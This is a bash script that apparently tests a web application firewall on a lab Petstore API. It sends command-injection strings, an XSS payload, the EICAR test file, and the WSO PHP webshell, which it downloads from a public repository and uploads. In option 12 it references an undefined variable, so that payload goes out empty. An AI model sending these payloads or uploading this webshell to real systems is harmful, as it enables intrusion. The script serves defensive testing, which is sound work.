#!/bin/bash

PETSTORE_URL='http://petstore.corp.fabriclab.ca/api/v3'

# wso.php is a backdoor/webshell and considered as a malware
wso_file="wso.php"
wso_url="https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso.php"
if [ ! -f "$wso_file" ]; then
    curl -sO $wso_url
fi

# eicar.txt is an Anti-Virus Test File
eicar_file="eicar.com.txt"
eicar_url="https://secure.eicar.org/eicar.com.txt"
if [ ! -f "$eicar_file" ]; then
    curl -sO $eicar_url
fi

# Encode content
WSO_CONTENT_JQ=$(jq -Rs . < $wso_file)
EICAR_CONTENT=$(< $eicar_file)

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[00;36m'
NC='\033[0m'

# Define the options for the menu
options=(
    'GET findByStatus?status=available                     - Normal Request'
    'GET findByStatus?status=sold                          - Normal Request'
    'GET findByStatus?status=pending                       - Normal Request'
    'GET findByStatus?                                     - Schema violation'
    'GET findByStatus?status=ABCDEFGHIJKL                  - URL too long'
    'GET findByStatus?status=A                             - URL too short'
    'GET findByStatus?status=;cmd.exe                      - Command Injection in URL'
    'POST {"status": "/bin/ls"}                            - Command Injection in JSON'
    'POST {"status": "xx& var1=l var2=s;\$var1\$var2"}     - Zero-Day in JSON'
    'POST {"status": "<script>alert(123)</script>"}        - XSS in JSON'
    'POST file=@wso.php                                    - Upload a Webshell'
    'POST file=@eicar.com.txt                              - Upload Eicar test file'
    'POST {"status": "*wso.php*"}                          - Webshell in JSON'
    'POST {"status": "*eicar.com.txt*"}                    - Eicar in JSON'
    'GET findByStatus?status=sold&status=pending           - Additional URL parameter'
    'GET accept: application/yaml                          - Non JSON request'
)

function execute_curl() {
    local command_index=$1
    case $command_index in
        0) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=available" -H "accept: application/json" -H "content-type: application/json" ;;
        1) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=sold" -H "Accept: application/json" -H "Content-Type: application/json" ;;
        2) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=pending" -H "Accept: application/json" -H "Content-Type: application/json" ;;
        3) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?" -H "Accept: application/json" -H "Content-Type: application/json" ;;
        4) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=ABCDEFGHIJKL" -H "Accept: application/json" -H "Content-Type: application/json" ;;
        5) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=A" -H "Accept: application/json" -H "Content-Type: application/json" ;;
        6) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=;cmd.exe" -H "Accept: application/json" -H "Content-Type: application/json" ;;
        7) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -H "Content-Type: application/json" -d "{\"id\": 110, \"category\": {\"id\": 110, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 110, \"name\": \"FortiCamel\"}], \"status\": \"/bin/ls\"}" ;;
        8) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -H "Content-Type: application/json" -d "{\"id\": 111, \"category\": {\"id\": 111, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 111, \"name\": \"FortiCamel\"}], \"status\": \"xx& var1=l var2=s;$var1$var2\"}" ;;
        9) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -H "Content-Type: application/json" -d "{\"id\": 111, \"category\": {\"id\": 111, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 112, \"name\": \"FortiCamel\"}], \"status\": \"<script>alert(123)</script>\"}" ;;
        10) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -F "file=@wso.php;type=application/x-php" -F "data={\"id\": 110, \"category\": {\"id\": 110, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 113, \"name\": \"FortiCamel\"}], \"status\": \"sold\"};type=application/json" ;;
        11) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -F "file=@eicar.com.txt;type=text/plain" -F "data={\"id\": 110, \"category\": {\"id\": 110, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 113, \"name\": \"FortiCamel\"}], \"status\": \"sold\"};type=application/json" ;;
        12) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -H "Content-Type: application/json" -d "{\"id\": 111, \"category\": {\"id\": 111, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 112, \"name\": \"FortiCamel\"}], \"status\": $WSO_CONTENT}" ;;
        13) curl -s -k -X "POST" "${PETSTORE_URL}/pet" -H "accept: application/json" -H "Content-Type: application/json" -d "{\"id\": 111, \"category\": {\"id\": 111, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 112, \"name\": \"FortiCamel\"}], \"status\": \"${EICAR_CONTENT}\"}" ;;
        14) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=sold&status=pending" -H "accept: application/json" -H "Content-Type: application/json" ;;
        15) curl -s -k -X "GET"  "${PETSTORE_URL}/pet/findByStatus?status=sold" -H "accept: application/yaml" -H "Content-Type: application/json" ;;
    esac
}

function select_option() {
    echo "Choose an option:"
    for i in "${!options[@]}"; do
        echo "$((i+1)). ${options[$i]}"
    done

    read -p "Enter your choice (1-${#options[@]}): " choice
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#options[@]} )); then
        echo -e "${RED}Invalid choice. Please try again.${NC}"
        select_option
        return
    fi

    echo -e "${CYAN}Executing CURL command:${NC}"
    execute_curl $((choice-1))
}

select_option
